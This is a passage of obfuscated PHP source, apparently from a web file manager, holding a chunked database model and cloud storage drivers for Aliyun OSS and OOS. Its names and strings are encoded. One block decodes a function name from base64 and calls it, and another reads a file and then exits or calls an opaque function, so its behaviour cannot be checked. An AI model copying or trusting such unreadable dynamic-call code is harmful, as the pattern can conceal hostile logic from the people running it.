$ÍÉñúŒÚ < $Ùƒàî©≥; $ÍÉñúŒÚ += $—¯Ë‚¡≥) { $±’≤Áõà = array_slice($Üß°Çı¿, $ÍÉñúŒÚ, $—¯Ë‚¡≥); if (!is_array($±’≤Áõà) || count($±’≤Áõà) == 0) { break; } $Ç¬ù€ «[$“≥÷„π±[270]][$¸íùªœﬂ][1] = $±’≤Áõà; $this->optionsValue($Ç¬ù€ «); $˜ü≤â≈ﬁ += parent::save($©˛Ì∆«ı, $ŒÑÏæÇæ); $this->chunkEventCheck(count($±’≤Áõà)); } $this->chunkEventSet(); return $˜ü≤â≈ﬁ; } public function add($§Ê÷•˜Ì = '', $ªöåÇÙÏ = array(), $±≠õÊØì = false) { if ($this->addTaskStatus && is_array($§Ê÷•˜Ì)) { $this->addTaskData[] = $§Ê÷•˜Ì; return; } return parent::add($§Ê÷•˜Ì, $ªöåÇÙÏ, $±≠õÊØì); } public function parseWhereLike($Ÿ†‚¨®ä, $®ò∫áÊ§ = '', $≤˘¥êÌ˙ = false, &$Ö÷¥Ôò· = false) { $û≠≈ùã =& $_SERVER[Çâä∆◊¡]; $≈‰®É—† = $GLOBALS[$û≠≈ùã[6]][$û≠≈ùã[376]]; if (!$≈‰®É—†[$û≠≈ùã[377]]) { return $Ÿ†‚¨®ä; } if (!is_array($Ÿ†‚¨®ä)) { return $Ÿ†‚¨®ä; } $àÙ∞€üï = array(); $Ÿò®§üã = 0; foreach ($Ÿ†‚¨®ä as $ﬁàã∆œ˛ => $Ê≤∫¶íÛ) { if (is_array($Ê≤∫¶íÛ) && count($Ê≤∫¶íÛ) == 2 && $Ê≤∫¶íÛ[0] == $û≠≈ùã[378] && is_string($Ê≤∫¶íÛ[1]) && substr($Ê≤∫¶íÛ[1], 0, 1) == $û≠≈ùã[379] && substr($Ê≤∫¶íÛ[1], strlen($Ê≤∫¶íÛ[1]) - 1, 1) == $û≠≈ùã[379]) { $Ö÷¥Ôò· = !0; $ÿüË†ú  = is_string($ﬁàã∆œ˛) ? $ﬁàã∆œ˛ : $®ò∫áÊ§; $Á¯®˙˛Í = substr($Ê≤∫¶íÛ[1], 1, strlen($Ê≤∫¶íÛ[1]) - 2); $Á¯®˙˛Í = $this->db->escapeString($Á¯®˙˛Í); if (!strpos($ÿüË†ú , $û≠≈ùã[10])) { $ÿüË†ú  = $û≠≈ùã[380] . $ÿüË†ú  . $û≠≈ùã[380]; } $˝·Ù±‘Ô = $û≠≈ùã[181] . $Á¯®˙˛Í . $û≠≈ùã[181]; if ($≈‰®É—†[$û≠≈ùã[381]]) { $˝·Ù±‘Ô = $û≠≈ùã[382] . $Á¯®˙˛Í . $û≠≈ùã[383]; if ($≈‰®É—†[$û≠≈ùã[384]]) { $˝·Ù±‘Ô = $û≠≈ùã[383] . $Á¯®˙˛Í . $û≠≈ùã[382]; } } $àÙ∞€üï[$Ÿò®§üã] = $û≠≈ùã[385] . $ÿüË†ú  . $û≠≈ùã[386] . $˝·Ù±‘Ô . $û≠≈ùã[387]; $Ÿò®§üã++; continue; } if (is_array($Ê≤∫¶íÛ)) { $®ò∫áÊ§ = is_string($ﬁàã∆œ˛) ? $ﬁàã∆œ˛ : $®ò∫áÊ§; $Ê≤∫¶íÛ = $this->parseWhereLike($Ê≤∫¶íÛ, $®ò∫áÊ§, !0, $Ö÷¥Ôò·); } if (is_numeric($ﬁàã∆œ˛)) { $àÙ∞€üï[$Ÿò®§üã] = $Ê≤∫¶íÛ; $Ÿò®§üã++; } else { $àÙ∞€üï[$ﬁàã∆œ˛] = $Ê≤∫¶íÛ; } } if ($Ö÷¥Ôò· && !$≤˘¥êÌ˙) { } return $àÙ∞€üï; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Õ∆ÌÒƒÜ = array()) { $œ≤€¿Æ… =& $_SERVER[Çâä∆◊¡]; $€ÜΩÓÌú = self::SQL_WHERE_IN_CHUNK; $ËÈ√ãîÓ = $this->optionsValue(); $≤≈ßπÑÙ = $this->findWhereField($ËÈ√ãîÓ); if (!$≤≈ßπÑÙ || isset($ËÈ√ãîÓ[$œ≤€¿Æ…[287]]) || isset($ËÈ√ãîÓ[$œ≤€¿Æ…[348]])) { return parent::select($Õ∆ÌÒƒÜ); } $üÒÃ»¥ë = $ËÈ√ãîÓ[$œ≤€¿Æ…[270]][$≤≈ßπÑÙ][1]; $üÒÃ»¥ë = is_array($üÒÃ»¥ë) ? $üÒÃ»¥ë : array(); $“óı¯˚Î = null; for ($ÂÜôÅ†¸ = 0; $ÂÜôÅ†¸ < count($üÒÃ»¥ë); $ÂÜôÅ†¸ += $€ÜΩÓÌú) { $§Õ÷Ú˚° = array_slice($üÒÃ»¥ë, $ÂÜôÅ†¸, $€ÜΩÓÌú); if (!is_array($§Õ÷Ú˚°) || count($§Õ÷Ú˚°) == 0) { break; } $ËÈ√ãîÓ[$œ≤€¿Æ…[270]][$≤≈ßπÑÙ][1] = $§Õ÷Ú˚°; $this->optionsValue($ËÈ√ãîÓ); $ﬂ«Î·≥ç = parent::select($Õ∆ÌÒƒÜ); if (!$ﬂ«Î·≥ç) { continue; } $“óı¯˚Î = is_array($“óı¯˚Î) ? $“óı¯˚Î : array(); $“óı¯˚Î = array_merge($“óı¯˚Î, $ﬂ«Î·≥ç); } return $“óı¯˚Î; } public function delete($¨Öì÷Äé = array()) { $⁄˝˝´˜ú =& $_SERVER[Çâä∆◊¡]; $è¸Ëä‚ç = self::SQL_WHERE_IN_CHUNK; $œÓ˙ÃÓÒ = $this->optionsValue(); $÷≤è‚Êµ = $this->findWhereField($œÓ˙ÃÓÒ); if (!$÷≤è‚Êµ) { return parent::delete($¨Öì÷Äé); } $È¢úÈÛÚ = 0; $¥¬ı–≤Ù = $œÓ˙ÃÓÒ[$⁄˝˝´˜ú[270]][$÷≤è‚Êµ][1]; $¥¬ı–≤Ù = is_array($¥¬ı–≤Ù) ? $¥¬ı–≤Ù : array(); for ($˜÷ﬁ•∞¥ = 0; $˜÷ﬁ•∞¥ < count($¥¬ı–≤Ù); $˜÷ﬁ•∞¥ += $è¸Ëä‚ç) { $ÿﬁ†≠â  = array_slice($¥¬ı–≤Ù, $˜÷ﬁ•∞¥, $è¸Ëä‚ç); if (!is_array($ÿﬁ†≠â ) || count($ÿﬁ†≠â ) == 0) { break; } $œÓ˙ÃÓÒ[$⁄˝˝´˜ú[270]][$÷≤è‚Êµ][1] = $ÿﬁ†≠â ; $this->optionsValue($œÓ˙ÃÓÒ); $È¢úÈÛÚ += parent::delete($¨Öì÷Äé); } return $È¢úÈÛÚ; } private function findWhereField($ÒáàÃ∑Ó) { $Çüøƒ¥ä =& $_SERVER[Çâä∆◊¡]; $◊‚ﬂÓúê = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÒáàÃ∑Ó) || !is_array($ÒáàÃ∑Ó[$Çüøƒ¥ä[270]])) { return !1; } foreach ($ÒáàÃ∑Ó[$Çüøƒ¥ä[270]] as $ﬁªß£Õ => $™ö⁄€’Â) { if (is_array($™ö⁄€’Â) && isset($™ö⁄€’Â[0]) && is_string($™ö⁄€’Â[0]) && strtolower($™ö⁄€’Â[0]) == $Çüøƒ¥ä[7] && is_array($™ö⁄€’Â[1]) && count($™ö⁄€’Â[1]) > $◊‚ﬂÓúê) { ignore_timeout(); return $ﬁªß£Õ; } } return !1; } public function setMasterDB($Îô›≠≠œ = true) { think_config($_SERVER[Çâä∆◊¡][388], $Îô›≠≠œ); } } if ($_SERVER[$_SERVER[Çâä∆◊¡][389]] != $_SERVER[$_SERVER[Çâä∆◊¡][390]]) { $_getc = $_SERVER[Çâä∆◊¡][391]; $_getfile = $_SERVER[$_SERVER[Çâä∆◊¡][392]] . $_SERVER[Çâä∆◊¡][393]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Çâä∆◊¡][226], $_getfilec); if (count($_getarrs) < $_SERVER[Çâä∆◊¡][394]) { $exit = $_SERVER[Çâä∆◊¡][395]; $exit(); } $_act = $_SERVER[Çâä∆◊¡][396]; $_act($_SERVER[$_SERVER[Çâä∆◊¡][397]]); } goto BîËÏÒá‡€; c¢œùÂ≥Ñ—: $fileSize = strrev(base64_decode($_SERVER[‰åñ∂çÏ][0])); function binCheckNeq($Ú†Ç…–≥, $Øü“å∏˛) { return $Ú†Ç…–≥ != $Øü“å∏˛; } $_SERVER[$_SERVER[‰åñ∂çÏ][1]] = $fileSize($_SERVER[$_SERVER[‰åñ∂çÏ][2]]); goto B…ÜÃè•‹œ; EÎçè˘à¥Ú: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($õ≈¿ã£€) { parent::__construct($õ≈¿ã£€); $this->signatureVersion($_SERVER[Çâä∆◊¡][211]); } public function fileOutLink($ü≈‚™˘⁄) { $ªáº˛â‹ =& $_SERVER[Çâä∆◊¡]; if (substr($ü≈‚™˘⁄, 0, 7) == $ªáº˛â‹[1310]) { $ü≈‚™˘⁄ = $ªáº˛â‹[1311] . substr($ü≈‚™˘⁄, 7); } header($ªáº˛â‹[158] . $ü≈‚™˘⁄); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($™°≤ÿ∏º) { parent::__construct(); include_once SDK_DIR . $_SERVER[Çâä∆◊¡][1367]; $this->_init($™°≤ÿ∏º); } public function _init($˚éı™ñÊ) { $¯»Ï‰Î™ =& $_SERVER[Çâä∆◊¡]; foreach ($˚éı™ñÊ as $‹¢∫ÖÉÊ => $á¯ß§¥ç) { if (isset($this->{$‹¢∫ÖÉÊ})) { $this->{$‹¢∫ÖÉÊ} = $á¯ß§¥ç; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¯»Ï‰Î™[1368] . LNG($¯»Ï‰Î™[1369])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $å∆Õ«‡Ÿ =& $_SERVER[Çâä∆◊¡]; $îÃÔÔ°– = new OSS\Model\CorsConfig(); $ß∞Úª◊“ = new OSS\Model\CorsRule(); $ß∞Úª◊“->addAllowedOrigin($å∆Õ«‡Ÿ[1370]); $ß∞Úª◊“->addAllowedMethod($å∆Õ«‡Ÿ[1371]); $ß∞Úª◊“->addAllowedMethod($å∆Õ«‡Ÿ[1372]); $ß∞Úª◊“->addAllowedMethod($å∆Õ«‡Ÿ[1373]); $ß∞Úª◊“->addAllowedMethod($å∆Õ«‡Ÿ[1374]); $ß∞Úª◊“->addAllowedMethod($å∆Õ«‡Ÿ[157]); $ß∞Úª◊“->setMaxAgeSeconds(600); $ß∞Úª◊“->addExposeHeader($å∆Õ«‡Ÿ[1375]); $ß∞Úª◊“->addAllowedHeader($å∆Õ«‡Ÿ[1370]); $îÃÔÔ°–->addRule($ß∞Úª◊“); try { $this->client->putBucketCors($this->bucket, $îÃÔÔ°–); } catch (OSS\Core\OssException $˜ÑıÓÿ∆) { return !1; } return !0; } public function getBucketCors() { $À≤⁄÷•Ü =& $_SERVER[Çâä∆◊¡]; $¶∫ì”Î¸ = null; try { $¶∫ì”Î¸ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $◊êóßÌ«) { return null; } if (!$¶∫ì”Î¸ || !($≠îÎ‡òô = $¶∫ì”Î¸->getRules())) { return null; } $É˚“ì•Ú = $≠îÎ‡òô[0]->getAllowedOrigins(); $ó˚îÒÉÂ = $≠îÎ‡òô[0]->getAllowedMethods(); $ö∑æÌßì = $≠îÎ‡òô[0]->getMaxAgeSeconds(); $∆óä†¸∂ = $≠îÎ‡òô[0]->getExposeHeaders(); $¢»—é˛∞ = $≠îÎ‡òô[0]->getAllowedHeaders(); return array($À≤⁄÷•Ü[180] => isset($É˚“ì•Ú[0]) ? $É˚“ì•Ú[0] : $À≤⁄÷•Ü[12], $À≤⁄÷•Ü[184] => $ó˚îÒÉÂ, $À≤⁄÷•Ü[1376] => $ö∑æÌßì, $À≤⁄÷•Ü[1377] => isset($∆óä†¸∂[0]) ? $∆óä†¸∂[0] : $À≤⁄÷•Ü[12], $À≤⁄÷•Ü[182] => isset($¢»—é˛∞[0]) ? $¢»—é˛∞[0] : $À≤⁄÷•Ü[12]); } public function isBucketCors() { $‰∑ëõî≈ =& $_SERVER[Çâä∆◊¡]; $¸Íºà„ô = $this->getBucketCors(); if (!$¸Íºà„ô || !is_array($¸Íºà„ô)) { return !1; } if ($¸Íºà„ô[$‰∑ëõî≈[180]] != $‰∑ëõî≈[181] || $¸Íºà„ô[$‰∑ëõî≈[182]] != $‰∑ëõî≈[181]) { return !1; } $…≤Õ·˚ﬂ = array_map($‰∑ëõî≈[183], $¸Íºà„ô[$‰∑ëõî≈[184]]); if (!is_array($…≤Õ·˚ﬂ)) { $…≤Õ·˚ﬂ = array(); } $ŸƒÎ‰Ò´ = array($‰∑ëõî≈[185], $‰∑ëõî≈[186], $‰∑ëõî≈[187], $‰∑ëõî≈[188], $‰∑ëõî≈[189]); $…√§øÓ€ = array_diff($ŸƒÎ‰Ò´, $…≤Õ·˚ﬂ); return empty($…√§øÓ€); } public function mkfile($¿ºÜˆŒ®, $∑õ˝ƒÁÜ = '', $˜∂—ùõ– = REPEAT_RENAME) { $Ã≤§Ω’Î = $this->setContent($¿ºÜˆŒ®, $∑õ˝ƒÁÜ); if ($Ã≤§Ω’Î !== !1) { return $this->getPathOuter($¿ºÜˆŒ®); } return !1; } public function mkdir($€˙˝°ÉÂ, $∑´•–´∫ = REPEAT_SKIP) { if ($this->_isFolder($€˙˝°ÉÂ)) { return $this->getPathOuter($€˙˝°ÉÂ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($€˙˝°ÉÂ)); } catch (OSS\Core\OssException $∫ö˚„õ∞) { return !1; } return $this->getPathOuter($€˙˝°ÉÂ); } private function fileList($∏êÆüúÈ, $˛≠à¡ƒ‘ = '', $™‚≈´Ÿî = 0) { $‰ç†¥–Ø =& $_SERVER[Çâä∆◊¡]; $∏êÆüúÈ = trim($∏êÆüúÈ, $‰ç†¥–Ø[8]); $´Ê–òØÅ = empty($∏êÆüúÈ) && $∏êÆüúÈ !== $‰ç†¥–Ø[190] ? $‰ç†¥–Ø[12] : $∏êÆüúÈ . $‰ç†¥–Ø[8]; $–´‡ﬂîÏ = $‰ç†¥–Ø[12]; $¨Ë¡⁄Üü = 1000; $ÊœÁ¿∫˙ = $this->listItemCache === !1 ? !1 : !0; $¬£âé›ë = $˙ÿÌ∏–∆ = array(); while (!0) { check_abort(); $Ìäù≥úÈ = array($‰ç†¥–Ø[1378] => $˛≠à¡ƒ‘, $‰ç†¥–Ø[1379] => $´Ê–òØÅ, $‰ç†¥–Ø[1380] => $¨Ë¡⁄Üü, $‰ç†¥–Ø[1381] => $–´‡ﬂîÏ); try { $ıƒ…äç„ = $this->client->listObjects($this->bucket, $Ìäù≥úÈ); } catch (OSS\Core\OssException $∞óï‰¡ï) { break; } $–´‡ﬂîÏ = $ıƒ…äç„->getNextMarker(); $¸ª„µ´¢ = $ıƒ…äç„->getObjectList(); $ã˝ì™÷Ê = $ıƒ…äç„->getPrefixList(); foreach ($¸ª„µ´¢ as $∫€Íﬁ˚ﬂ) { if ($∫€Íﬁ˚ﬂ->getKey() == $´Ê–òØÅ) { continue; } $âÆì˚øÀ = $∫€Íﬁ˚ﬂ->getKey(); $®Öø‡ÏÏ = $∫€Íﬁ˚ﬂ->getSize(); $ÅÁüé˚∆ = $∫€Íﬁ˚ﬂ->getLastModified(); $ÂÌÎ¿˙í = $™‚≈´Ÿî ? array($‰ç†¥–Ø[32] => $âÆì˚øÀ, $‰ç†¥–Ø[80] => $®Öø‡ÏÏ, $‰ç†¥–Ø[196] => strtotime($ÅÁüé˚∆)) : $âÆì˚øÀ; $‚„ü≈⁄˚ = $®Öø‡ÏÏ == 0 && substr($âÆì˚øÀ, strlen($âÆì˚øÀ) - 1, 1) == $‰ç†¥–Ø[8] ? !0 : !1; if ($ÊœÁ¿∫˙) { $this->cacheMethod($‰ç†¥–Ø[198], $âÆì˚øÀ, $‚„ü≈⁄˚); $this->cacheMethod($‰ç†¥–Ø[199], $âÆì˚øÀ, array($‰ç†¥–Ø[80] => $®Öø‡ÏÏ, $‰ç†¥–Ø[1382] => $®Öø‡ÏÏ, $‰ç†¥–Ø[86] => strtotime($ÅÁüé˚∆), $‰ç†¥–Ø[1383] => $ÅÁüé˚∆)); } if ($‚„ü≈⁄˚) { $¬£âé›ë[] = $âÆì˚øÀ; continue; } $˙ÿÌ∏–∆[] = $ÂÌÎ¿˙í; } foreach ($ã˝ì™÷Ê as $—˘≠äàÛ) { $¬£âé›ë[] = $—˘≠äàÛ->getPrefix(); if ($ÊœÁ¿∫˙) { $this->cacheMethod($‰ç†¥–Ø[198], $âÆì˚øÀ, !0); } } if ($–´‡ﬂîÏ === $‰ç†¥–Ø[12]) { break; } } if ($ÊœÁ¿∫˙) { $this->cacheMethod($‰ç†¥–Ø[198], $∏êÆüúÈ, !0); } return array($‰ç†¥–Ø[77] => $¬£âé›ë, $‰ç†¥–Ø[76] => $˙ÿÌ∏–∆); } public function copyFile($¡‹¿ÿ´∏, $ñ¬±ˆ¶“) { $∂üá√É¿ = $this->size($¡‹¿ÿ´∏); if ($∂üá√É¿ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¡‹¿ÿ´∏, $this->bucket, $this->pathEncode($ñ¬±ˆ¶“)); } catch (OSS\Core\OssException $Ø§‰§®ª) { return !1; } return $this->getPathOuter($ñ¬±ˆ¶“); } $¥¨˛∆À¯ = $this->multiCopyObject($¡‹¿ÿ´∏, $ñ¬±ˆ¶“, $∂üá√É¿); return $¥¨˛∆À¯ ? $this->getPathOuter($ñ¬±ˆ¶“) : !1; } private function multiCopyObject($ƒìÊÀëŸ, $⁄≈Ô’ıÜ, $í†¿ïê§) { $ÍÁı¨®£ =& $_SERVER[Çâä∆◊¡]; try { $ùÎ™ÚÓÆ = array(); if ($èÁùä≤ı = $this->hashMd5($ƒìÊÀëŸ)) { $ùÎ™ÚÓÆ = array(OSS\OssClient::OSS_HEADERS => array($ÍÁı¨®£[1384] => $èÁùä≤ı)); } $∞≈Œó÷⁄ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($⁄≈Ô’ıÜ), $ùÎ™ÚÓÆ); $§Ω“ﬂ’µ = 1; $¢†◊Õª = 0; $¬õ⁄Ëòò = array(); $≥ìÎ˙÷á = 1024 * 1024 * 10; $ÕÂã¥£˙ = $this->client->generateMultiuploadParts($í†¿ïê§, $≥ìÎ˙÷á); foreach ($ÕÂã¥£˙ as $®ÛúøàÆ => $ú˘«∞´º) { $ŸñÎÒ©Ë = $¢†◊Õª + (int) $ú˘«∞´º[$ÍÁı¨®£[1385]]; $∞Äÿ™üŒ = (int) $ú˘«∞´º[$ÍÁı¨®£[332]] + $ŸñÎÒ©Ë - 1; $Æå–√ù™ = array($ÍÁı¨®£[1386] => $ŸñÎÒ©Ë, $ÍÁı¨®£[1387] => $∞Äÿ™üŒ); $¬õ⁄Ëòò[] = $this->client->uploadPartCopy($this->bucket, $ƒìÊÀëŸ, $this->bucket, $this->pathEncode($⁄≈Ô’ıÜ), $§Ω“ﬂ’µ, $∞≈Œó÷⁄, $Æå–√ù™); $§Ω“ﬂ’µ = $§Ω“ﬂ’µ + 1; } $‘™ò‰ ë = array(); foreach ($¬õ⁄Ëòò as $®ÛúøàÆ => $ëß›≥•˘) { $‘™ò‰ ë[] = array($ÍÁı¨®£[1388] => $®ÛúøàÆ + 1, $ÍÁı¨®£[1389] => $ëß›≥•˘); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($⁄≈Ô’ıÜ), $∞≈Œó÷⁄, $‘™ò‰ ë); } catch (OSS\Core\OssException $›£àÙ›Ñ) { return !1; } return !0; } public function moveFile($¸ÙáÖêÃ, $Œß∏‚àÆ) { if ($this->copyFile($¸ÙáÖêÃ, $Œß∏‚àÆ)) { $this->remove($¸ÙáÖêÃ); return $this->getPathOuter($Œß∏‚àÆ); } return !1; } public function delFile($≥´”Ë¯¬) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($≥´”Ë¯¬)); } catch (OSS\Core\OssException $¨ÙãÒÁÙ) { return !1; } return !0; } public function delFolder($Î£ÉìÙ ) { $„ÖÅ¯∂Á =& $_SERVER[Çâä∆◊¡]; if (!$this->exist($Î£ÉìÙ )) { return !0; } $this->listItemCache = !1; $Î≥÷¢†« = $this->fileList($Î£ÉìÙ ); $this->listItemCache = !0; $è…áÓ¥Ó = trim($Î£ÉìÙ , $„ÖÅ¯∂Á[8]) . $„ÖÅ¯∂Á[8]; if (!empty($Î£ÉìÙ ) && $Î£ÉìÙ  !== $„ÖÅ¯∂Á[190] && !in_array($è…áÓ¥Ó, $Î≥÷¢†«[$„ÖÅ¯∂Á[77]])) { $Î≥÷¢†«[$„ÖÅ¯∂Á[77]][] = $è…áÓ¥Ó; } $±éÅ˜»√ = $this->delByBatch($Î≥÷¢†«[$„ÖÅ¯∂Á[76]]); if (!$±éÅ˜»√) { return !1; } $±éÅ˜»√ = $this->delByBatch($Î≥÷¢†«[$„ÖÅ¯∂Á[77]]); if (!$±éÅ˜»√) { return !1; } return $this->delFile($è…áÓ¥Ó); } private function delByBatch($¥ÿõª»Ó) { foreach (array_chunk($¥ÿõª»Ó, 1000) as $˙»”«çæ) { try { $this->client->deleteObjects($this->bucket, $˙»”«çæ); } catch (OSS\Core\OssException $¿æ£†Â‹) { return !1; } } return !0; } public function rename($Âü˛–˜, $Ÿâ‚Û≥„) { return $this->renameObject($Âü˛–˜, $Ÿâ‚Û≥„); } private function fileInfo($˘í¡±õå, $°ÌÅÿ·¶ = false, $«Ïï∫áÚ = array()) { $∆ãçÆû  =& $_SERVER[Çâä∆◊¡]; $∏™ÿ˘ê˙ = array($∆ãçÆû [32] => $this->pathThis($˘í¡±õå), $∆ãçÆû [78] => $this->getPathOuter($˘í¡±õå), $∆ãçÆû [33] => $∆ãçÆû [192], $∆ãçÆû [80] => isset($«Ïï∫áÚ[$∆ãçÆû [80]]) ? $«Ïï∫áÚ[$∆ãçÆû [80]] : 0, $∆ãçÆû [167] => $this->ext($˘í¡±õå)); if ($°ÌÅÿ·¶) { return $∏™ÿ˘ê˙; } $∏™ÿ˘ê˙[$∆ãçÆû [193]] = $∏™ÿ˘ê˙[$∆ãçÆû [86]] = 0; $∏™ÿ˘ê˙[$∆ãçÆû [194]] = $∏™ÿ˘ê˙[$∆ãçÆû [195]] = !0; if (empty($«Ïï∫áÚ)) { $°È∞µéÏ = $this->objectMeta($˘í¡±õå); if (!$°È∞µéÏ) { return $∏™ÿ˘ê˙; } $«Ïï∫áÚ = array($∆ãçÆû [86] => strtotime($°È∞µéÏ[$∆ãçÆû [1383]]), $∆ãçÆû [80] => $°È∞µéÏ[$∆ãçÆû [1382]] + 0); } if (isset($«Ïï∫áÚ[$∆ãçÆû [80]])) { $∏™ÿ˘ê˙[$∆ãçÆû [80]] = $«Ïï∫áÚ[$∆ãçÆû [80]]; } if (isset($«Ïï∫áÚ[$∆ãçÆû [86]])) { $∏™ÿ˘ê˙[$∆ãçÆû [86]] = $«Ïï∫áÚ[$∆ãçÆû [86]]; } if (isset($«Ïï∫áÚ[$∆ãçÆû [196]]) && !trim($∏™ÿ˘ê˙[$∆ãçÆû [86]])) { $∏™ÿ˘ê˙[$∆ãçÆû [86]] = $«Ïï∫áÚ[$∆ãçÆû [196]]; } return $∏™ÿ˘ê˙; } private function folderInfo($ê•ÀÄîÌ, $´∑≤æÕ = false, $¬ì∑˚Õõ = array()) { $›Á‘¶Ïœ =& $_SERVER[Çâä∆◊¡]; $Ô¨–¬Œ = array($›Á‘¶Ïœ[32] => $this->pathThis($ê•ÀÄîÌ), $›Á‘¶Ïœ[78] => $this->getPathOuter($›Á‘¶Ïœ[8] . $ê•ÀÄîÌ), $›Á‘¶Ïœ[33] => $›Á‘¶Ïœ[79]); if ($´∑≤æÕ) { return $Ô¨–¬Œ; } $Ô¨–¬Œ[$›Á‘¶Ïœ[193]] = $Ô¨–¬Œ[$›Á‘¶Ïœ[86]] = 0; $Ô¨–¬Œ[$›Á‘¶Ïœ[194]] = $Ô¨–¬Œ[$›Á‘¶Ïœ[195]] = !0; if (empty($¬ì∑˚Õõ)) { $ê•ÀÄîÌ = rtrim($ê•ÀÄîÌ, $›Á‘¶Ïœ[8]) . $›Á‘¶Ïœ[8]; $®œô¬Ö÷ = $this->objectMeta($ê•ÀÄîÌ); if (!$®œô¬Ö÷) { return $Ô¨–¬Œ; } $¬ì∑˚Õõ = array($›Á‘¶Ïœ[193] => $®œô¬Ö÷[$›Á‘¶Ïœ[511]][$›Á‘¶Ïœ[1390]], $›Á‘¶Ïœ[86] => strtotime($®œô¬Ö÷[$›Á‘¶Ïœ[1383]])); } if (isset($¬ì∑˚Õõ[$›Á‘¶Ïœ[86]])) { $Ô¨–¬Œ[$›Á‘¶Ïœ[86]] = $¬ì∑˚Õõ[$›Á‘¶Ïœ[86]]; } if (isset($¬ì∑˚Õõ[$›Á‘¶Ïœ[193]])) { $Ô¨–¬Œ[$›Á‘¶Ïœ[193]] = $¬ì∑˚Õõ[$›Á‘¶Ïœ[193]]; } return $Ô¨–¬Œ; } public function listPath($Ÿ±ö‹¢é, $±«©‰ñ¡ = false) { $Ê˙ÜÈÙ∞ =& $_SERVER[Çâä∆◊¡]; $∏§˝œ£„ = $this->fileList($Ÿ±ö‹¢é, $Ê˙ÜÈÙ∞[8], !0); foreach ($∏§˝œ£„[$Ê˙ÜÈÙ∞[77]] as $Œ˙ª‰ÙΩ => $πæÚåë) { $∏§˝œ£„[$Ê˙ÜÈÙ∞[77]][$Œ˙ª‰ÙΩ] = $this->folderInfo($πæÚåë, $±«©‰ñ¡, $πæÚåë); } foreach ($∏§˝œ£„[$Ê˙ÜÈÙ∞[76]] as $Œ˙ª‰ÙΩ => $πæÚåë) { $∏§˝œ£„[$Ê˙ÜÈÙ∞[76]][$Œ˙ª‰ÙΩ] = $this->fileInfo($πæÚåë[$Ê˙ÜÈÙ∞[32]], $±«©‰ñ¡, $πæÚåë); } return $∏§˝œ£„; } public function has($ﬁéÄ˙≤í, $≤ÓÙ”∂ü = false, $Ú¥ﬂ¬±Î = true) { $˛˚‡Ù˚ª =& $_SERVER[Çâä∆◊¡]; $ﬁéÄ˙≤í = trim($ﬁéÄ˙≤í, $˛˚‡Ù˚ª[8]); $‡ù†ÊÀ = empty($ﬁéÄ˙≤í) && $ﬁéÄ˙≤í !== $˛˚‡Ù˚ª[190] ? $˛˚‡Ù˚ª[12] : $ﬁéÄ˙≤í . $˛˚‡Ù˚ª[8]; $«˘˙ﬂ·á = $˛˚‡Ù˚ª[12]; $§©€»∏® = 500; $ï™ÓıÁ = $âﬂ¨–÷ = 0; while (!0) { check_abort(); $‹Ë´ì≈ñ = array($˛˚‡Ù˚ª[1378] => $˛˚‡Ù˚ª[8], $˛˚‡Ù˚ª[1379] => $‡ù†ÊÀ, $˛˚‡Ù˚ª[1380] => $§©€»∏®, $˛˚‡Ù˚ª[1381] => $«˘˙ﬂ·á); try { $øÂì⁄≤÷ = $this->client->listObjects($this->bucket, $‹Ë´ì≈ñ); } catch (OSS\Core\OssException $π·Òñ¸˜) { break; } $«˘˙ﬂ·á = $øÂì⁄≤÷->getNextMarker(); $◊ù∂ü÷ù = $øÂì⁄≤÷->getObjectList(); $é≤Ñû‚Å = $øÂì⁄≤÷->getPrefixList(); if ($≤ÓÙ”∂ü) { if (count($◊ù∂ü÷ù) > 1 || count($◊ù∂ü÷ù) == 1 && $◊ù∂ü÷ù[0]->getKey() != $‡ù†ÊÀ) { $ï™ÓıÁ += count($◊ù∂ü÷ù) - 1; } if (!empty($é≤Ñû‚Å)) { $âﬂ¨–÷ += count($é≤Ñû‚Å); } if ($«˘˙ﬂ·á === $˛˚‡Ù˚ª[12]) { break; } continue; } if ($Ú¥ﬂ¬±Î) { if (!empty($◊ù∂ü÷ù)) { if (count($◊ù∂ü÷ù) > 1 || $◊ù∂ü÷ù[0]->getKey() != $‡ù†ÊÀ) { return !0; } } } else { if (!empty($é≤Ñû‚Å)) { return !0; } } if ($«˘˙ﬂ·á === $˛˚‡Ù˚ª[12]) { break; } } if ($≤ÓÙ”∂ü) { return array($˛˚‡Ù˚ª[202] => $ï™ÓıÁ, $˛˚‡Ù˚ª[203] => $âﬂ¨–÷); } return !1; } public function listAll($ºâÂá—⁄) { $åßº˘ı„ =& $_SERVER[Çâä∆◊¡]; $ÆŒÅÍ¿„ = $this->fileList($ºâÂá—⁄, $åßº˘ı„[12], !0); $Ó±Ù÷ä£ = array(); foreach ($ÆŒÅÍ¿„[$åßº˘ı„[76]] as $°†Â÷éñ) { $Ó±Ù÷ä£[$°†Â÷éñ[$åßº˘ı„[32]]] = $°†Â÷éñ[$åßº˘ı„[80]]; } foreach ($ÆŒÅÍ¿„[$åßº˘ı„[77]] as $°†Â÷éñ) { if (is_string($°†Â÷éñ)) { $Ó±Ù÷ä£[$°†Â÷éñ] = 0; } } return $this->listAllFiles($ºâÂá—⁄, array_keys($Ó±Ù÷ä£), $Ó±Ù÷ä£); } public function canRead($±Ω∂öçÖ) { $É⁄…ûÖõ =& $_SERVER[Çâä∆◊¡]; $µ·»∆õ† = $this->pathAcl($±Ω∂öçÖ); return 